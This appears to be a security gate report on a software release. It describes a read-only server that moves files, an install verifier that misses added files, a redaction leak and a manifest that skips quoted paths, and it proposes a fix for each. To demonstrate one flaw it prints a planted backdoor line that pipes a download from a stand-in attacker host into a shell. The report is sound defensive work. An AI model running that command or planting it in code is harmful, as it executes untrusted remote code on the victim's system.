# Final blockers, from the 10/10 gate

Verdict: DO NOT PUBLISH. Two blockers and three gates, all in code written after the last
adversarial pass, which is exactly where the gate was aimed. Items 1 and 2 were
reproduced by the orchestrator by hand.

The meta-lesson, recorded because it is mine: I drove the server's protocol, saw it
answer correctly, and then wrote a README claiming it is read-only "permanent rather than
pending". I proved it ANSWERS. I never tested that it does not WRITE. Same class as every
other failure today: verify the happy path, then state the guarantee.

## BLOCKER 1: the read-only server writes, moves, and deletes (VERIFIED BY ORCHESTRATOR)

Reproduced. Healthy store, then 32 bytes of the header overwritten to simulate
corruption, then ONE `bm_status` call through the protocol:

    BEFORE: store.sqlite3, store.sqlite3-shm, store.sqlite3-wal
    AFTER:  store.sqlite3.quarantine-20260726T132600801086-63a5fa1c

The founder's store is GONE from its path. The server inherited the store's quarantine
behavior, which is correct for a writer and catastrophic for a reader. On a HEALTHY store
it also creates the -shm and -wal sidecars, so even the success path writes.

Worse, the quarantine is returned with isError false, so a client reads a store
relocation as a successful health check.

Every claim of read-only is therefore false: the module docstring, the initialize
response the client is told, and mcp/README.md (mine).

Fix, and it must be structural rather than a promise: open the database in a mode that
CANNOT write. Use sqlite's immutable or read-only URI at the connection level, or copy
the file to a temporary path and read the copy, so the code path that quarantines is
unreachable from this process. Then prove it: a test that corrupts a store, calls every
tool, and asserts the directory listing is byte-identical afterwards, plus a test that a
healthy store gains no sidecars. If a genuinely read-only open is impossible with the
current store API, say so and NARROW THE CLAIM in every one of the three places instead
of leaving a false one.

## BLOCKER 2: verify-install passes with a planted backdoor (VERIFIED BY ORCHESTRATOR)

Reproduced:

    manifest: 88 hashes
    (planted tools/bm_helper.py containing os.system("curl attacker.example/x | sh"))
    verify-install: PASSED. Every file the manifest names matches on disk.
    exit=0

It iterates manifest lines and never enumerates what is actually on disk, so an ADDED
file is invisible. This is the control sold as the answer to "how do I know what I
installed" for code that runs automatically on every session. A tampered file and a
deleted file are both caught; an added one is not, which is the attack that matters most.

Fix: enumerate the installed tree, compare BOTH directions, and name extra files as a
failure. Update RELEASE.md and CHANGELOG.md, whose current wording promises exactly the
behavior that does not exist.

## GATE 3: the server leaks founder text every other exit redacts

`verify()` returns raw rows and the store's CLI redacts them at its output funnel. The
server calls verify() and prints the problem strings straight through, so a record name
reaches the client unredacted. Proven by the same project answering two ways:

    bm_store.py verify  ->  active record '[REDACTED]' (07f7c630) ...
    tools/call bm_status ->  active record 'ghp_AAAAAAAAAAAAAAAABBBB' (07f7c630) ...

The round-7 structural test that forbids unfunnelled output scans only bm_store.py, so
the new file was outside the guard entirely. Fix the leak AND widen the structural test
to every shipping module, because a guard that covers one file will keep being escaped
by the next file.

## GATE 4: project_root is not authoritative, so the server answers about another project

A relative path is joined to the SERVER PROCESS's own working directory, and the
BROTHERMODE_ROOT environment variable overrides the argument outright. Proven: a call
naming projB returned projA's record, and the success output never names the root it
actually read. This is precisely the defect mcp/README.md claims requiring project_root
prevents.

Fix: refuse a relative project_root outright, ignore the environment variable when an
explicit root is given, and PRINT the resolved root on every success so a substitution
cannot be silent.

## GATE 5: the checksum manifest silently omits files git quotes

Any tracked path containing a quote, a backslash, or a non-ASCII character is emitted
quoted by git, does not exist as a literal path, and is dropped by the loop with no
message and exit 0. Proven: 91 tracked files, 89 hashed, two silently skipped, and those
two were then replaced with "BACKDOOR PAYLOAD" while verification still reported PASSED.
Today's tree is all ASCII so no shipped manifest is wrong yet; the control fails the
first time such a file is added.

Fix: use a null-delimited listing so no path needs quoting, and fail loudly if the count
hashed does not equal the count listed.

## SOFT 6: the decisions filter compares against the redacted name

Filtering by a record's real name returns "no decisions recorded", which is
indistinguishable from a project that genuinely recorded none, so a session can conclude
nothing was decided and decide it again. Filter before redaction, or document the
behavior; do not leave a false negative that reads as a fact.
